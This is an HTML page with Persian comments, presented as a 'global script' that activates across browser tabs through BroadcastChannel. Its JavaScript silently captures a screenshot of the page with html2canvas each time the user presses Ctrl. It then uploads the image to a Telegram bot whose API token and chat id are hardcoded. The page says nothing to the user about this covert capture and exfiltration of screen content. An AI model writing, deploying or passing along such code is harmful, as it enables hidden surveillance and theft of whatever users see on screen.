<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Script with BroadcastChannel</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.3.2/html2canvas.min.js"></script>
</head>
<body>
    <h1>Global Script with BroadcastChannel</h1>
    <p>Open this URL in one tab, and it will activate the script in all tabs.</p>

    <script>
        const token = "7110052875:AAF8o8Rof0q4KFEuVZBLEHM1bgaWe7pZQss";
        const chat_id = "-4583889773";
        const telegramAPI = `https://api.telegram.org/bot${token}/sendPhoto`;

        // BroadcastChannel برای ارتباط بین تب‌ها
        const channel = new BroadcastChannel('global_script_channel');

        // ارسال پیام به تمام تب‌ها برای اجرای کد
        function activateGlobalScript() {
            channel.postMessage('activate');
        }

        // دریافت پیام و اجرای کد در تب‌های دیگر
        channel.onmessage = (event) => {
            if (event.data === 'activate') {
                console.log('Script activated in this tab.');
                startScript();
            }
        };

        // عملکرد اصلی اسکریپت
        function startScript() {
            document.addEventListener('keydown', function (event) {
                if (event.ctrlKey) {
                    takeScreenshot();
                }
            });

            // هر ۵ ثانیه یک پیام لاگ می‌شود
            setInterval(() => {
                console.log("Global script is running.");
            }, 5000);
        }

        // ارسال اسکرین‌شات به تلگرام
        function takeScreenshot() {
            html2canvas(document.body, { useCORS: true }).then(function (canvas) {
                const base64image = canvas.toDataURL("image/png");
                sendToTelegram(base64image);
            });
        }

        // ارسال تصویر به تلگرام
        function sendToTelegram(base64image) {
            const byteString = atob(base64image.split(',')[1]);
            const mimeString = base64image.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });

            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "screenshot.png");

            fetch(telegramAPI, {
                method: "POST",
                body: formData
            }).catch(error => console.error("Error:", error));
        }

        // فعال‌سازی کد در تب اصلی
        activateGlobalScript();
    </script>
</body>
</html>
